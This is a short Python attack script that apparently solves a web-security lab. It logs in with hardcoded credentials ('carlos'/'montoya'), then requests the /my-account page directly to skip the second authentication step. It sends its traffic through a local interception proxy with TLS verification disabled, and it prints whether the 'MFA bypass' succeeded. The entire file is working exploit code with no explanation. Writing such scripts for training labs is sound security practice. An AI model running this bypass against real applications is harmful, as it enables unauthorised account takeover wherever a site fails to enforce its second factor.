import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FAIL = -1

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

def is_mfa_bypassed(url, session):
    login_url = url + "/login"
    login_data = {
        "username": "carlos", 
        "password": "montoya"}
    request = session.post(
        login_url,
        data=login_data,
        allow_redirects=False,
        verify=False,
        proxies=proxies)
    myaccount_url = url + "/my-account"
    request = session.get(
        myaccount_url,
        verify=False,
        proxies=proxies)
    return "Log out" in request.text

if __name__ == "__main__":
    try:
        url = sys.argv[1]
        session = requests.Session()
        if is_mfa_bypassed(url, session):
            print("[+] MFA bypass successful")
        else:
            print("[-] MFA bypass unsuccessful")
    except IndexError:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(FAIL)
    except Exception as exception:
        print("An exception occured %s" % exception)
        print("[-] The MFA attack was not successful.")
        sys.exit(FAIL)     
